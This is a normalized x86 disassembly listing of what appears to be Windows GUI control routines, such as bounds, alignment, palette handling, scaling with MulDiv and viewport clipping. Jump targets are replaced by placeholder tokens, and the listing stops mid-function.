cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_448ec0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44979c
sub_448ee0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449788
sub_448f00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_448f20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420fcc
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e54
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449ed0
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448a40
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_44ad94
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_448ff8
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403508
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46866c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034f0
push edi
xor ecx ecx
mov edx 0xb039
call sub_44afd4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_4497c0
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403350
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403154
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403154
mov eax [ edi + 0x68 ]
call sub_403154
mov eax [ edi + 0x64 ]
call sub_408964
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421018
test bl bl
jle r-xdata
sub_4490c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_4490ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403350
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_449174
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_449474
sub_449194
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403154
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44bdf0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403350
mov edx ebx
mov eax edi
call sub_42109c
mov eax ebx
mov si 0xffd9
call sub_403350
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44925c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_42142c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44afd4
sub_4492f0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_449dd8
jmp r-xdata
xor edx edx
mov eax esi
call sub_449194
sub_449334
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403350
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_449174
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403350
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4493dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44b564
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a268
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_449474
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44afd4
mov eax ebx
mov si 0xffd0
call sub_403350
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403350
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_449474
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_449590
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_4495b4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_4495dc
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_449600
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_449624
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44971f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403350
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449726
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41874c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403350
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403350
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418454
sub_449730
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a268
mov edx edi
mov eax ebx
call sub_4497e0
mov edx edi
mov eax ebx
call sub_44b078
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44979c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403fa4
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_4497e0
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44983c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_449868
mov edx eax
mov ecx esp
mov eax esi
call sub_416efc
mov edx esp
mov eax ebx
call sub_449cac
pop ecx
pop edx
pop esi
pop ebx
retn
sub_449880
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_449824
mov ecx esp
mov edx esi
call sub_416efc
mov edx esp
mov eax ebx
call sub_449cac
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4498a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449929
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449930
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
sub_449938
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_449964
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_449990
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_464bc0
sub_4499c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44afd4
sub_449a3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_4242ac
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4242c8
sub_449c08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_449c9e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_421524
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_449e20
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_40435c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449ca5
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_449e50
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_449cac
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_449cf4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
test esi esi
je r-xdata
mov edx ebx
call sub_44d394
mov edx ebx
mov eax esi
call sub_44d2c0
mov eax ebx
call sub_449474
sub_449d40
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403350
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44afd4
mov eax edi
mov si 0xffd0
call sub_403350
sub_449dd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45db20
mov edx ebx
mov eax esi
call sub_42109c
sub_449dfc
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44afd4
pop ebx
retn
sub_449e20
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_449d94
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404040
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_449da4
sub_449e50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449ea5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449e20
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40435c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449eac
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax esi
call sub_404410
mov edx eax
mov eax ebx
call sub_449dfc
sub_449ed0
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_424208
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44afd4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_424208
mov [ ebx + 0x84 ] eax
sub_44a058
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44a048
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_446ff0
mov eax esi
call sub_446ff0
jmp r-xdata
sub_44a090
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41860c
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4184a0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41862c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a268
mov eax ebx
call sub_460b10
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403350
sub_44a110
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44a090
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44a090
jmp r-xdata
sub_44a134
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44a1ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a1d1
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
sub_44a1dc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41860c
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
